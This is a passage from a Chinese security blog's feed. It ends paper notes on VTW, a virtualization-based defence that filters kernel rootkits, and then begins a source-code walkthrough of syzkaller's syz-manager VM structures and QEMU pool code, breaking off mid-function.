方案已经报告了其在不同平台上的高可移植性。</p><p>根据解决恶意软件变种的能力，我们将检测、防护、可追踪性能力分为三个级别：好、一般、差。</p><p>对于 rootkit 检测，VTW、Xtier、Virtuoso、RTKDSM 都被评为好。对于防护与可追踪性，所有的方案都被评为一般或差，仅有 DIKernel 展示了一些防护能力。与 VTW 类似，所有报道的方案都运行在 x86 处理器，除了 DIKernel 在 arm-v7。</p><p>我们的实验揭示了一些在 CPU 上的测量结果与存储开销。如与 表.6 中剩余的方案对比所示，VTW 在实施所有的防护与过滤操作的系统开销上展现了显著的优势。特别的，我们想要指出使用 VMST 与 PTKDSM 方案的过度开销。</p><h1 id="8-Concluding-Remarks"><a href="#8-Concluding-Remarks" class="headerlink" title="8 Concluding Remarks"></a>8 Concluding Remarks</h1><p>本论文提出了一种新的虚拟化墙（virtual wall，VTW）方案以在 Linux 服务器上过滤内核 rootkit。总而言之，我们证明了我们的 VTW 防护方案在 rootkit 的检测、防护、可追踪性上有着较好的表现。VTW 比其他任何 rootkit 防护系统的内存与存储开销都要低得多。</p><p>所有在 guest 模式下损坏安全策略的操作都将导致操作系统陷入到 host 模式中，VTW 利用一种内存访问控制机制与一个事件注入机制来完成 rootkit 过滤过程。</p><p>未来追踪 LKMs 的执行路径与所有的内核攻击参与者，我们提出了一种基于 LKM 执行路径的追踪机制。我们的 VTW 实时保护了静态内核数据的完整性。对于动态内核对象，VTW 在追踪过程中检测内核数据的可用性，由此每个被破坏的 LKM 数据都可以被检测与恢复。</p><p>我们的 VTW 使用通用防护异常来防止更多的损害。当内核攻击的参与者涉及多个内核 rootkits 时，我们可以通过检查 LKM 的执行路径获得与攻击相关的执行实体。我们追踪在一次攻击中所有参与的内核 rootkits。VTW 为总的 CPU 时间增加了额外的 2% 。</p><p>消极的一面是，VTW 被限制于仅能保护 Linux 服务器。我们的 VTW 方案仅支持 Intel 处理器与 Linux 系统。VTW 并不能在 AMD、ARM 处理器或是运行 Windows 的服务器上运行。SYRINGE、VMST、DIKernel 防护方案亦是如此。</p><p>VTW 对 BIOS 或用户级的 rootkit 攻击的防护有限。对于可能损害内核完整性的 rootkits，他们可能使用 $&#x2F;dev&#x2F;kmem$ 或 $&#x2F;dev&#x2F;mem$ 或其他方案，这可以从本论文的 VTW 中扩展。由于页数限制，我们将在未来的工作中使用这些扩展。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;任何 rootkit，终将绳之以法！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="http://blog.arttnba3.cn/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="http://blog.arttnba3.cn/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>【FUZZ.0x02】syzkaller - II：syz-manager源码分析</title>
    <link href="http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/"/>
    <id>http://blog.arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/</id>
    <published>2023-03-01T20:33:58.000Z</published>
    <updated>2023-03-01T20:40:20.334Z</updated>
    
    <content type="html"><![CDATA[<p>宁就是👴の Manager 🐎</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>syzkaller 是一个非常经典的 kernel fuzzer，虽然笔者之前曾经用过（不过笔者太菜了啥都没挖出来）也曾粗略读过源码，但是没有太过于仔细分析就抛在脑后了（悲）</p><p>为了深入学习 fuzzing theory，笔者决定先从这个典中典的 syzkaller 源码进行分析学习 ：）</p><h2 id="PRE-工作原理"><a href="#PRE-工作原理" class="headerlink" title="PRE.工作原理"></a>PRE.工作原理</h2><p>对于 syzkaller 的架构，官方给出了这样的一张 Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><p>syzkaller 整体上为一个<strong>双机调试结构</strong>：由一台机器负责管控整个 fuzzing 流程（本文称为 <code>Host</code>），在另一台机器上进行 fuzzing（本文称为 <code>Guest</code>），Guest 通常为虚拟机，从而能让 Host 更好地管控整个流程</p><p>syzkaller 分为三大组件：</p><ul><li><p>位于 Host：</p><ul><li><code>syz-manager</code> ：syzkaller 的控制中枢，其会启动多个 VM 实例（如图所示的一个黄色卡片就是一个实例）并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code></li></ul></li><li><p>位于 Guest：</p><ul><li><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：<ul><li>生成 input</li><li>启动 <code>syz-executor</code> 进程进行 fuzz</li><li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖（coverage）的相关信息</li><li>通过 RPC 将新的覆盖回送到 <code>syz-manager</code></li></ul></li><li><code>syz-executor</code>：负责<strong>执行单个输入</strong>——从 <code>syz-fuzzer</code> 处接受 input 并执行，最后回送结果</li></ul></li></ul><p><code>syz-manager</code> 为 syzkaller 的控制中枢，其会启动多个 VM 实例并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code>，我们通常启动 fuzzing 时便是以 <code>syz-manager</code> 作为程序启动的入口点，因此笔者也先从此处开始分析</p><h1 id="0x01-基本结构体"><a href="#0x01-基本结构体" class="headerlink" title="0x01. 基本结构体"></a>0x01. 基本结构体</h1><p>相比于直接开始分析源码，笔者认为有必要在此之前先列出一些基本的结构体，你也可以把这一节当成一个表来查 ：）</p><h2 id="VM-管控相关"><a href="#VM-管控相关" class="headerlink" title="VM 管控相关"></a>VM 管控相关</h2><p>Host 需要去感知与管控 Guest VMs，因而在 <code>syz-manager</code> 当中有着一套相应的表示与管理 Guest VM 的结构体</p><h3 id="1-Instance：VM-实例"><a href="#1-Instance：VM-实例" class="headerlink" title="1. Instance：VM 实例"></a>1. Instance：VM 实例</h3><p><code>syz-manager</code> 中的 VM 实际上是使用一个名为 <code>Instance</code> 的结构体来表示的，定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>类似地，其需要实现 <code>Interface</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance 表示一个单独的 VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy 复制一个 hostSrc 文件到 VM 中并返回 VM 中的文件名.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward 设置从虚拟机内到主机上给定 tcp 端口的转发，</span><br><span class="hljs-comment">// 并返回要在虚拟机中使用的地址.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run 在虚拟机内执行命令 (类似 ssh cmd).</span><br><span class="hljs-comment">// outc 接受混合了命令行与内核控制台的输出.</span><br><span class="hljs-comment">// errc 接受命令等待返回 error 或 vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command 在 timeout 后停止. 在 stop chan 上发送可以用以更早将其终止.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose 从 VM 上检索额外的调试信息</span><br><span class="hljs-comment">// (例如通过发送一些 sys-rq&#x27;s 或 SIGABORT&#x27;ing 一个 Go 程序).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// 选择性地直接返回 (一些或所有) 信息. 若 wait == true,</span><br><span class="hljs-comment">// 调用者必须等待 VM 直接输出信息到其日志.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep 描述了 Diagnose 被调用的原因.</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close 停止并销毁 VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>：将一个来自宿主机的文件拷贝至虚拟机中，返回虚拟机中的文件名.</li><li><code>Forward()</code>：设置从虚拟机内到主机上给定 tcp 端口的转发，并返回要在虚拟机中使用的地址</li><li><code>Run()</code>：在虚拟机内执行命令</li><li><code>Diagnose()</code>：在虚拟机上检索额外的调试信息</li><li><code>Close()</code>：停止并销毁虚拟机</li></ul><p>需要注意的是<strong>不同类型的 Guest VM 所实现的 Interface 接口是不同的</strong></p><blockquote><p>以 QEMU 为例，其实现主要位于 <code>vm/qemu/qemu.go</code> 中</p></blockquote><h3 id="2-Pool：VM-池"><a href="#2-Pool：VM-池" class="headerlink" title="2.Pool：VM 池"></a>2.Pool：VM 池</h3><p>类似于线程池的概念，在 <code>syz-manager</code> 中使用一个 <strong>VM 池</strong> —— <code>Pool</code> 结构体来管控 Guest VM，该结构体定义于 <code>vm/vm.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该结构体实现了 <code>Pool</code> 接口，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool 表示了一组特定类型的测试机器 (虚拟机, 物理设备, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count 返回池中所有 VM 的数量.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create 创建并启动一个新的 VM 实例.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>：返回池中所有 VM 的数量</li><li><code>Create()</code>：<strong>新建并启动一个 VM实例</strong>，返回新建的实例对象</li></ul><h4 id="QEMU-VM-浅析"><a href="#QEMU-VM-浅析" class="headerlink" title="QEMU VM 浅析"></a>QEMU VM 浅析</h4><p>以 QEMU 为例的 Pool 接口实现如下，对于 <code>Count()</code> 而言会直接返回配置文件中的计数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> 则会首先检查文件系统镜像是否为 <code>9p</code> 格式，若是则会生成一个 ssh key 存放到 <code>key</code> 文件中并生成一个 <code>init.sh</code> 文件；接下来就是调用 <code>ctor()</code> 函数创建虚拟机：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> 的实现比较简单，主要就是创建一个带着 ssh key 及一些配置信息与一个 channel 的 <code>instance</code> 实例，初始化实例内的管道并调用 <code>boot()</code> 函数进行正式的创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> 函数主要就是各种参数判断，之后<strong>把 QEMU 起了以后 ssh 连上去</strong>，这里就不摘抄代码了：）</p><h3 id="3-Env：单个-VM-Pool-的环境变量"><a href="#3-Env：单个-VM-Pool-的环境变量" class="headerlink" title="3. Env：单个  VM Pool 的环境变量"></a>3. Env：单个  VM Pool 的环境变量</h3><p><code>Env</code> 结构体为用于一个 VM Pool 的环境变量，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env 包含了用于 VM 池的全局常量参数.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// 独特的名字</span><br><span class="hljs-comment">// 若几个 Pool 共享了全局命名空间则可被用于 VM name 的冲突解决</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-序列化的 VM-类型-特定配置</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Type：VM-类型"><a href="#4-Type：VM-类型" class="headerlink" title="4. Type：VM 类型"></a>4. Type：VM 类型</h3><p>一个 VM Pool 中只能有一种类型的 VM，因而不同类型的 VM 的 Pool 应当要有不同的构造函数，在 <code>syz-manager</code> 中使用 <code>Type</code> 结构体表示一种 VM 的类型信息，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> 为构造函数类型，其接受一个 <code>Env</code> 类型的结构体指针（储存了全局的一些基本信息），并返回一个 VM Pool 实例</p><p>由一个全局的 <code>string→Type</code> 映射表存储了不同类型 VM 的信息，在正式启动之前程序会通过 <code>Register()</code> 函数将不同类型的 VM 信息注册到该表中，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register 在包中注册一个新的 VM 类型.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>以 <code>QEMU</code> 为例，其在包被导入时注册构造函数，主要是调用 <code>LoadData()</code> 解析配置文件后进行检查，这里不再赘叙：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, 